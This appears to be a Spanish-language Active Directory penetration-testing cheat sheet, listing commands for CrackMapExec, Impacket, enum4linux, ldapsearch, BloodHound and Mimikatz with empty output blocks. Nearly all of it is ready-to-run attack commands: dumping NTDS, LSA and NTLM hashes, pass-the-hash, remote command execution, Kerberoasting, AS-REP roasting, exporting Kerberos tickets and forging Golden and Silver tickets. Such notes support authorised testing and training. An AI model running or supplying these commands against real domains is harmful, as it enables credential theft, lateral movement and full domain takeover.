# Crackmapexec

## Información básica 
`crackmapexec smb 10.10.10.10`

```java

```
## Usuarios con credenciales válidas 
`crackmapexec smb 10.10.10.10 -u usuario -p password --users`

```java

```
## Recursos compartidos 
`crackmapexec smb 10.10.10.10 -u usuario -p password --shares`

```java

```
## Dumping Hashes
`crackmapexec smb 10.10.10.10 -u usuario -p password --ntds`

```java

```
## Pass the Hash 
`crackmapexec smb 10.10.10.10 -u usuario -H "hash"`

```java

```
## Ejecución remota de comandos (RCE) 
`crackmapexec smb 10.10.10.10 -u Administrator -H "hash" -x "ipconfig"`

```java

```
## Políticas de dominio 
`crackmapexec smb 10.10.10.10 -u usuario -p password --policies`

```java

```

# Impacket

## Enumerar SPNs (Service Principal Names) 
`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py dominio/usuario:password@10.10.10.10`

```java

```
## Kerberoasting 

`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.10 dominio/usuario:password`

```java

```
## AS-REP Roasting 
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py dominio/ -no-pass -usersfile usuarios.txt -dc-ip 10.10.10.10`

```java

```

## Hashes dumping 
###### Dumping NTLM Hashes
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py dominio/usuario:password@10.10.10.10`

```java

```
###### Using Pass the Hash for dumping NTLM Hashes
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py dominio/usuario@10.10.10.10 -hashes lmhash:nthash`

```java

```
###### Pass the Hash 
`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py dominio/usuario@10.10.10.10 -hashes lmhash:nthash`

`python3 /usr/share/doc/python3-impacket/examples/smbexec.py dominio/usuario@10.10.10.10 -hashes lmhash:nthash`

`python3 /usr/share/doc/python3-impacket/examples/atexec.py dominio/usuario@10.10.10.10 -hashes lmhash:nthash`

```java

```

# Enum4linux

## Información general
`enum4linux -a 10.10.10.10`

```java

```
## Usuarios
`enum4linux -U 10.10.10.10`

```java

```
## Recursos compartidos
`enum4linux -S 10.10.10.10`

```java

```

# LDAP

## Enumerar objetos LDAP
`ldapsearch -x -h 10.10.10.10 -D "cn=usuario,dc=dominio,dc=com" -w 'password' -b "dc=dominio,dc=com"`

```java

```

## Buscar usuarios en AD
`ldapsearch -x -h 10.10.10.10 -D "cn=usuario,dc=dominio,dc=com" -w 'password' -b "dc=dominio,dc=com" "(objectClass=user)"`

```java

```

# Bloodhount

## Instalación de Bloodhound y neo4j 
`sudo apt install bloodhound neo4j`
`sudo neo4j console`
`bloodhound`

```java

```

## Ejecutar Sharphound en el host 
Descargar [SharpHound](https://github.com/BloodHoundAD/BloodHound)

`.\SharpHound.exe -c All`

```java

```

# Mimikatz

## Dumping hashes 
`privilege::debug`
`lsadump::lsa /patch`

```java

```

## Pass the Ticket 
###### Dumping ticket Kerberos
`sekurlsa::tickets /export`
###### Usar ticket Kerberos
`kerberos::ptt ticket.kirbi`
###### Listar tickets Kerberos
`kerberos::list`

```java

```

## Golden and Silver Ticket
###### Crear un Golden Ticket
`kerberos::golden /user:usuario /domain:dominio.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /id:500`
###### Crear un Silver Ticket
`kerberos::golden /user:usuario /domain:dominio.com /sid:S-1-5-21-... /target:servidor /service:cifs /rc4:hash /id:500`
###### Inyectar Tickets
`kerberos::ptt ticket.kirbi`

